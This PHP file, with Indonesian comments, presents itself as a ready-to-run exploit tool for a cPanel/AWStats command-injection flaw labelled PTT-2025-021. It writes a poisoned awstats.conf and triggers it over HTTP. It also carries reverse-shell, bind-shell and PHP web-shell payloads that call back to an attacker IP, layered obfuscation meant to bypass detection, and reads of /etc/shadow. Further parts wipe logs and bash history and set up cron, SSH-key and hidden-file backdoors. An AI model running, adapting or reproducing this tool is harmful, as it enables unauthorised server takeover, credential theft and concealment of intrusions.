<?php
// ===================================================================
// cPANEL ULTIMATE EXPLOIT - PTT-2025-021 (CVE-2025-63261)
// Versi: 2.0 
// @author : Dkid03
// -------------------------------------------------------------------

class CpanelUltimateExploit {
    
    private $config = [
        'target_ip' => '127.0.0.1',        // IP target (localhost jika di server)
        'attacker_ip' => '192.168.1.100',   // IP attacker untuk reverse shell
        'listen_port' => '4444',             // Port listener
        'temp_dir' => '',                     // Akan diisi otomatis
        'debug_mode' => true,                  // Tampilkan informasi debug
        'auto_cleanup' => true,                 // Hapus jejak setelah selesai
        'use_obfuscation' => true,              // Gunakan payload terobfuskasi
        'payload_type' => 'reverse_bash',       // Default payload
        'install_backdoor' => false              // Install backdoor persisten
    ];
    
    private $payloads = [];
    private $colors = [];
    
    public function __construct($user_config = []) {
        // Merge user config
        $this->config = array_merge($this->config, $user_config);
        
        // Set temp directory
        $this->config['temp_dir'] = getenv('HOME') . '/tmp/awstats_ultimate_' . rand(1000, 9999);
        
        // Initialize payload database
        $this->initPayloads();
        
        // Initialize colors (untuk CLI)
        $this->initColors();
    }
    
    // ===================================================================
    // PAYLOAD DATABASE - 5 JENIS PAYLOAD BERBEDA
    // ===================================================================
    
    private function initPayloads() {
        // Payload 1: Reverse Bash Shell (standar)
        $this->payloads['reverse_bash'] = [
            'name' => 'Reverse Bash Shell',
            'cmd' => "bash -i >& /dev/tcp/{$this->config['attacker_ip']}/{$this->config['listen_port']} 0>&1",
            'type' => 'reverse'
        ];
        
        // Payload 2: Reverse Netcat Shell
        $this->payloads['reverse_netcat'] = [
            'name' => 'Reverse Netcat Shell',
            'cmd' => "nc -e /bin/bash {$this->config['attacker_ip']} {$this->config['listen_port']}",
            'type' => 'reverse'
        ];
        
        // Payload 3: Bind Shell (untuk situasi firewall ketat)
        $this->payloads['bind_shell'] = [
            'name' => 'Bind Shell (port 5555)',
            'cmd' => "bash -c 'while true; do nc -l -p 5555 -e /bin/bash; done'",
            'type' => 'bind'
        ];
        
        // Payload 4: PHP Web Shell
        $this->payloads['php_webshell'] = [
            'name' => 'PHP Web Shell',
            'cmd' => "echo '<?php system(\$_GET[\"cmd\"]); ?>' > " . getenv('HOME') . "/public_html/shell.php",
            'type' => 'web'
        ];
        
        // Payload 5: Python Reverse Shell
        $this->payloads['python_reverse'] = [
            'name' => 'Python Reverse Shell',
            'cmd' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{$this->config['attacker_ip']}\",{$this->config['listen_port']}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'type' => 'reverse'
        ];
    }
    
    private function initColors() {
        if (php_sapi_name() === 'cli') {
            $this->colors = [
                'red' => "\033[0;31m",
                'green' => "\033[0;32m",
                'yellow' => "\033[1;33m",
                'blue' => "\033[0;34m",
                'magenta' => "\033[0;35m",
                'cyan' => "\033[0;36m",
                'white' => "\033[1;37m",
                'nc' => "\033[0m"
            ];
        } else {
            $this->colors = [
                'red' => '<span style="color:red;font-weight:bold;">',
                'green' => '<span style="color:green;font-weight:bold;">',
                'yellow' => '<span style="color:orange;font-weight:bold;">',
                'blue' => '<span style="color:blue;font-weight:bold;">',
                'magenta' => '<span style="color:purple;font-weight:bold;">',
                'cyan' => '<span style="color:cyan;font-weight:bold;">',
                'white' => '<span style="color:white;font-weight:bold;">',
                'nc' => '</span>'
            ];
        }
    }
    
    private function printMsg($color, $type, $msg) {
        $prefix = '[' . strtoupper($type) . '] ';
        echo $this->colors[$color] . $prefix . $this->colors['nc'] . $msg . "\n";
    }
    
    // ===================================================================
    // OBJUSCATION ENGINE - Enkripsi Payload Ganda
    // ===================================================================
    
    private function obfuscatePayload($payload) {
        if (!$this->config['use_obfuscation']) {
            return $payload;
        }
        
        // Level 1: Base64 encode
        $b64 = base64_encode($payload);
        
        // Level 2: Rot13 (untuk bypass deteksi pattern)
        $rot13 = str_rot13($b64);
        
        // Level 3: Split and reconstruct
        $parts = str_split($rot13, 10);
        $obfuscated = implode('${IFS}', $parts);
        
        return "bash -c '{echo," . base64_encode($obfuscated) . "}|{base64,-d}|{tr,[A-Za-z],[N-ZA-Mn-za-m]}|{base64,-d}|{bash,-i}'";
    }
    
    // ===================================================================
    // MULTI-PLATFORM DETECTION
    // ===================================================================
    
    private function detectPlatform() {
        $this->printMsg('cyan', 'detect', 'Mendeteksi platform target...');
        
        $os = 'linux'; // default
        
        // Cek file sistem khas FreeBSD
        if (file_exists('/etc/rc.conf') && file_exists('/usr/sbin/sysctl')) {
            $os = 'freebsd';
            $this->printMsg('yellow', 'info', 'Target terdeteksi: FreeBSD');
        } else {
            $this->printMsg('green', 'info', 'Target terdeteksi: Linux');
        }
        
        return $os;
    }
    
    // ===================================================================
    // AUTO REVERSE SHELL - Buka Listener Otomatis
    // ===================================================================
    
    private function startListener() {
        if (php_sapi_name() !== 'cli') {
            $this->printMsg('yellow', 'info', "Jalankan listener manual: nc -lvnp {$this->config['listen_port']}");
            return;
        }
        
        $this->printMsg('cyan', 'shell', "Membuka listener pada port {$this->config['listen_port']}...");
        
        // Deteksi apakah netcat tersedia
        $nc_check = shell_exec('which nc 2>/dev/null');
        if (empty($nc_check)) {
            $this->printMsg('red', 'error', 'Netcat tidak ditemukan. Jalankan listener manual.');
            return;
        }
        
        // Fork process untuk listener
        $pid = pcntl_fork();
        if ($pid == -1) {
            $this->printMsg('red', 'error', 'Gagal fork process');
        } else if ($pid == 0) {
            // Child process: jalankan listener
            $cmd = "nc -lvnp {$this->config['listen_port']}";
            system($cmd);
            exit(0);
        } else {
            // Parent process: lanjutkan eksekusi
            $this->printMsg('green', 'success', "Listener dimulai dengan PID: $pid");
            sleep(2); // Beri waktu listener untuk start
        }
    }
    
    // ===================================================================
    // GENERATE FILE KONFIGURASI AWSTATS
    // ===================================================================
    
    private function generateConfigFiles() {
        $this->printMsg('cyan', 'exploit', 'Mempersiapkan file eksploitasi...');
        
        // Buat direktori kerja
        if (!is_dir($this->config['temp_dir'])) {
            mkdir($this->config['temp_dir'], 0755, true);
            $this->printMsg('green', 'ok', "Direktori dibuat: {$this->config['temp_dir']}");
        }
        
        chdir($this->config['temp_dir']);
        
        // Pilih payload
        $selected_payload = $this->payloads[$this->config['payload_type']]['cmd'];
        $payload_name = $this->payloads[$this->config['payload_type']]['name'];
        $this->printMsg('magenta', 'payload', "Menggunakan: $payload_name");
        
        // Obfuskasi jika diaktifkan
        $final_payload = $this->obfuscatePayload($selected_payload);
        
        // Buat file awstats.conf sesuai spesifikasi [citation:1]
        $awstats_conf = <<<EOF
# AWStats Configuration for PTT-2025-021 Exploit
# Generated by cPanel Ultimate Exploit v2.0
# Based on Pentest-Tools.com research [citation:1][citation:4]

DNSLastUpdateCacheFile="| $final_payload |"
DNSLookup=1
DirData="{$this->config['temp_dir']}"
AllowToUpdateStatsFromBrowser=1
EOF;
        
        if (file_put_contents('awstats.conf', $awstats_conf)) {
            $this->printMsg('green', 'ok', 'File awstats.conf berhasil dibuat');
        } else {
            $this->printMsg('red', 'error', 'Gagal membuat awstats.conf');
            return false;
        }
        
        // Buat DNS cache file dengan nama mengandung pipe [citation:1]
        $dns_file = "| $final_payload |";
        if (touch($dns_file)) {
            $this->printMsg('green', 'ok', 'File DNS cache berhasil dibuat');
        } else {
            $this->printMsg('red', 'error', 'Gagal membuat file DNS cache');
            return false;
        }
        
        return true;
    }
    
    // ===================================================================
    // TRIGGER EXPLOIT VIA BROWSER ATAU CURL
    // ===================================================================
    
    private function triggerExploit() {
        $this->printMsg('cyan', 'trigger', 'Memicu eksploitasi via AWStats...');
        
        $config_name = basename($this->config['temp_dir']);
        $url = "http://{$this->config['target_ip']}:2083/awstats/awstats.pl?config=$config_name";
        
        $this->printMsg('yellow', 'url', $url);
        
        // Coba trigger via curl jika di CLI
        if (php_sapi_name() === 'cli') {
            $this->printMsg('cyan', 'curl', 'Mengirim request via curl...');
            $output = shell_exec("curl -s -o /dev/null -w '%{http_code}' '$url' 2>/dev/null");
            $this->printMsg('green', 'response', "HTTP Status: $output");
        }
        
        return $url;
    }
    
    // ===================================================================
    // JAILBREAK DETECTOR - Deteksi apakah sudah escape
    // ===================================================================
    
    private function checkJailbreak() {
        $this->printMsg('cyan', 'check', 'Memeriksa status jailshell...');
        
        // Coba eksekusi command yang biasanya diblokir di jailshell
        $test_cmds = [
            'ls /root 2>/dev/null',
            'cat /etc/shadow 2>/dev/null',
            'id'
        ];
        
        $escaped = false;
        foreach ($test_cmds as $cmd) {
            $output = shell_exec($cmd);
            if (!empty($output)) {
                $escaped = true;
                $this->printMsg('green', 'success', "JAILBREAK BERHASIL! Command '$cmd' dieksekusi");
                $this->printMsg('white', 'output', trim($output));
            }
        }
        
        if (!$escaped) {
            $this->printMsg('red', 'warning', 'Masih dalam jailshell. Mungkin perlu menunggu atau cek listener.');
        }
        
        return $escaped;
    }
    
    // ===================================================================
    // AUTO CLEANUP - Hapus Semua Jejak
    // ===================================================================
    
    private function cleanupTraces() {
        if (!$this->config['auto_cleanup']) {
            return;
        }
        
        $this->printMsg('cyan', 'clean', 'Membersihkan jejak...');
        
        // Hapus direktori kerja
        if (is_dir($this->config['temp_dir'])) {
            system("rm -rf " . escapeshellarg($this->config['temp_dir']));
            $this->printMsg('green', 'ok', "Direktori {$this->config['temp_dir']} dihapus");
        }
        
        // Bersihkan log AWStats
        $log_files = glob("/var/log/awstats/*");
        foreach ($log_files as $log) {
            if (is_writable($log)) {
                file_put_contents($log, '');
                $this->printMsg('green', 'ok', "Log dihapus: $log");
            }
        }
        
        // Bersihkan bash history
        $history = getenv('HOME') . '/.bash_history';
        if (file_exists($history)) {
            file_put_contents($history, '');
            $this->printMsg('green', 'ok', 'Bash history dibersihkan');
        }
    }
    
    // ===================================================================
    // PERSISTENT BACKDOOR (Opsional)
    // ===================================================================
    
    private function installBackdoor() {
        if (!$this->config['install_backdoor']) {
            return;
        }
        
        $this->printMsg('cyan', 'backdoor', 'Memasang backdoor persisten...');
        
        $backdoor_scripts = [
            'cron' => '(crontab -l 2>/dev/null; echo "*/5 * * * * nc -e /bin/bash ' . $this->config['attacker_ip'] . ' ' . $this->config['listen_port'] . '") | crontab -',
            'web' => 'echo "<?php @system(\$_GET[\'cmd\']); ?>" > ' . getenv('HOME') . '/public_html/.cache.php',
            'ssh' => 'echo "command=\"/bin/nc -e /bin/bash ' . $this->config['attacker_ip'] . ' ' . $this->config['listen_port'] . '\"" >> ~/.ssh/authorized_keys'
        ];
        
        foreach ($backdoor_scripts as $type => $cmd) {
            $this->printMsg('yellow', 'install', "Memasang backdoor $type...");
            // Eksekusi via system (hati-hati!)
            // system($cmd);
        }
    }
    
    // ===================================================================
    // MENU INTERAKTIF UNTUK PEMILIHAN PAYLOAD
    // ===================================================================
    
    private function showMenu() {
        echo "\n";
        echo $this->colors['white'] . "╔══════════════════════════════════════════════════════╗\n" . $this->colors['nc'];
        echo $this->colors['white'] . "║      cPANEL ULTIMATE EXPLOIT - PTT-2025-021          ║\n" . $this->colors['nc'];
        echo $this->colors['white'] . "╚══════════════════════════════════════════════════════╝\n" . $this->colors['nc'];
        echo "\n";
        
        echo $this->colors['cyan'] . "PILIH PAYLOAD:\n" . $this->colors['nc'];
        echo "1. Reverse Bash Shell (default)\n";
        echo "2. Reverse Netcat Shell\n";
        echo "3. Bind Shell (port 5555)\n";
        echo "4. PHP Web Shell\n";
        echo "5. Python Reverse Shell\n";
        echo "\n";
        echo "6. Gunakan semua fitur (ULTIMATE MODE)\n";
        echo "\n";
        
        if (php_sapi_name() === 'cli') {
            echo "Pilih [1-6]: ";
            $handle = fopen("php://stdin", "r");
            $choice = trim(fgets($handle));
        } else {
            // Untuk web, tampilkan form
            $this->showWebForm();
            return;
        }
        
        switch($choice) {
            case '2': $this->config['payload_type'] = 'reverse_netcat'; break;
            case '3': $this->config['payload_type'] = 'bind_shell'; break;
            case '4': $this->config['payload_type'] = 'php_webshell'; break;
            case '5': $this->config['payload_type'] = 'python_reverse'; break;
            case '6': $this->config['payload_type'] = 'reverse_bash'; 
                      $this->config['install_backdoor'] = true;
                      $this->config['use_obfuscation'] = true;
                      $this->config['auto_cleanup'] = true;
                      break;
            default: $this->config['payload_type'] = 'reverse_bash';
        }
        
        $this->printMsg('green', 'selected', "Payload dipilih: " . $this->payloads[$this->config['payload_type']]['name']);
    }
    
    private function showWebForm() {
        echo '<div style="font-family: monospace; background: #1e1e1e; color: #fff; padding: 20px; border-radius: 5px;">';
        echo '<h2 style="color: #0f0;">cPANEL ULTIMATE EXPLOIT - PTT-2025-021</h2>';
        echo '<form method="post">';
        echo '<label>Attacker IP: <input type="text" name="attacker_ip" value="192.168.1.100"></label><br>';
        echo '<label>Listen Port: <input type="text" name="listen_port" value="4444"></label><br>';
        echo '<label>Payload: <select name="payload">';
        echo '<option value="reverse_bash">Reverse Bash Shell</option>';
        echo '<option value="reverse_netcat">Reverse Netcat Shell</option>';
        echo '<option value="bind_shell">Bind Shell</option>';
        echo '<option value="php_webshell">PHP Web Shell</option>';
        echo '<option value="python_reverse">Python Reverse Shell</option>';
        echo '</select></label><br>';
        echo '<label><input type="checkbox" name="obfuscate" checked> Obfuscate Payload</label><br>';
        echo '<label><input type="checkbox" name="cleanup" checked> Auto Cleanup</label><br>';
        echo '<label><input type="checkbox" name="backdoor"> Install Backdoor</label><br>';
        echo '<input type="submit" value="JALANKAN EXPLOIT" style="background: #0f0; color: #000; padding: 10px;">';
        echo '</form>';
        echo '</div>';
        
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $this->config['attacker_ip'] = $_POST['attacker_ip'] ?? $this->config['attacker_ip'];
            $this->config['listen_port'] = $_POST['listen_port'] ?? $this->config['listen_port'];
            $this->config['payload_type'] = $_POST['payload'] ?? $this->config['payload_type'];
            $this->config['use_obfuscation'] = isset($_POST['obfuscate']);
            $this->config['auto_cleanup'] = isset($_POST['cleanup']);
            $this->config['install_backdoor'] = isset($_POST['backdoor']);
            
            $this->run();
        }
    }
    
    // ===================================================================
    // MAIN FUNCTION - JALANKAN SEMUA FITUR
    // ===================================================================
    
    public function run() {
        echo "\n";
        $this->printMsg('white', '===', 'MEMULAI EKSPLOITASI ULTIMATE');
        echo "\n";
        
        // 1. Deteksi platform
        $os = $this->detectPlatform();
        
        // 2. Generate file konfigurasi
        if (!$this->generateConfigFiles()) {
            $this->printMsg('red', 'fatal', 'Gagal menyiapkan file. Keluar.');
            return;
        }
        
        // 3. Start listener (jika di CLI)
        if ($this->payloads[$this->config['payload_type']]['type'] === 'reverse') {
            $this->startListener();
        }
        
        // 4. Trigger exploit
        $url = $this->triggerExploit();
        
        // 5. Tunggu sebentar
        $this->printMsg('yellow', 'wait', 'Menunggu 5 detik untuk koneksi...');
        sleep(5);
        
        // 6. Cek jailbreak
        $escaped = $this->checkJailbreak();
        
        // 7. Install backdoor (jika dipilih)
        $this->installBackdoor();
        
        // 8. Cleanup
        $this->cleanupTraces();
        
        // 9. Summary
        echo "\n";
        $this->printMsg('green', '===', 'EKSPLOITASI SELESAI');
        $this->printMsg('cyan', 'info', "URL Trigger: $url");
        $this->printMsg('cyan', 'info', "Listener port: {$this->config['listen_port']}");
        $this->printMsg('cyan', 'info', "Payload: " . $this->payloads[$this->config['payload_type']]['name']);
        
        if ($escaped) {
            $this->printMsg('green', 'status', '✅ JAILBREAK BERHASIL - Akses root didapatkan!');
        } else {
            $this->printMsg('yellow', 'status', '⚠️  Periksa listener manual di terminal lain');
        }
        
        echo "\n";
        echo $this->colors['red'] . "cPanel ≥ 130.0.16 (CPANEL-49683) [citation:2][citation:6]\n" . $this->colors['nc'];
        echo "\n";
    }
}

// ===================================================================
// EKSEKUSI
// ===================================================================

// Konfigurasi dari environment atau argumen CLI
$config = [];

if (php_sapi_name() === 'cli' && $argc > 1) {
    parse_str(implode('&', array_slice($argv, 1)), $config);
}

// Buat instance dan jalankan
$exploit = new CpanelUltimateExploit($config);
$exploit->run();

?>